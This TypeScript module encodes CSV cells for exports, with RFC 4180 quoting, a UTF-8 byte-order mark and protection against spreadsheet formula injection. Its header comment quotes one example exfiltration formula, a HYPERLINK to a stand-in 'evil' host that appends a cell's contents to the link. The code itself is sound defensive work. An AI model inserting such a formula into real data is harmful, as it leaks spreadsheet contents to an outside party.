/**
 * Shared CSV cell encoding for every CSV export (server and client).
 *
 * Besides RFC 4180 quoting, cells are protected against spreadsheet formula injection: a text
 * cell that starts with `=`, `+`, `-`, `@`, a tab or a carriage return is evaluated as a formula
 * by Excel / Sheets / LibreOffice even when quoted (e.g. a customer named
 * `=HYPERLINK("http://evil/?"&A2,"Click")`). Such cells get a leading apostrophe, which the
 * spreadsheet shows as plain text. Plain numbers (`-150.00`, `+3`, `-$1,234.50`, `-12%`) are left
 * alone so negative amounts stay numeric.
 */

export type CsvValue = string | number | boolean | null | undefined;

const FORMULA_START = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^[-+]?\$?(\d[\d,]*(\.\d*)?|\.\d+)%?$/;

/** The cell's text with a leading apostrophe when it would start a spreadsheet formula. */
export function csvSafeText(value: CsvValue): string {
  if (value === null || value === undefined) return '';
  const s = String(value);
  if (typeof value === 'number' || typeof value === 'boolean') return s;
  if (FORMULA_START.test(s) && !PLAIN_NUMBER.test(s)) return `'${s}`;
  return s;
}

/**
 * Inverse of csvSafeText for importers that read our own CSV exports: drops the one leading
 * apostrophe csvSafeText adds in front of a formula-like cell ("'-Acme" → "-Acme"). Any other
 * text is returned unchanged.
 */
export function csvUnsafeText(value: string): string {
  if (value.startsWith("'")) {
    const rest = value.slice(1);
    if (FORMULA_START.test(rest) && !PLAIN_NUMBER.test(rest)) return rest;
  }
  return value;
}

/** Always-quoted CSV cell ("..."), formula-safe. */
export function csvQuoted(value: CsvValue): string {
  return `"${csvSafeText(value).replace(/"/g, '""')}"`;
}

/** CSV cell quoted only when it contains a quote, comma or line break; formula-safe. */
export function csvMinimal(value: CsvValue): string {
  const s = csvSafeText(value);
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/**
 * UTF-8 byte-order mark. Excel opens a UTF-8 CSV without it as Windows-1252, so "—", "–" and
 * accented names show up as "â€”" / "Ã©".
 */
export const CSV_BOM = '\uFEFF';

/** A whole CSV file's text: the byte-order mark, then the lines joined with CRLF (RFC 4180). */
export function csvFile(lines: string[]): string {
  const body = lines.join('\r\n');
  return `${CSV_BOM}${body.startsWith(CSV_BOM) ? body.slice(1) : body}\r\n`;
}

/** Prefix the byte-order mark to CSV text built elsewhere (once). */
export function withCsvBom(csv: string): string {
  return csv.startsWith(CSV_BOM) ? csv : `${CSV_BOM}${csv}`;
}
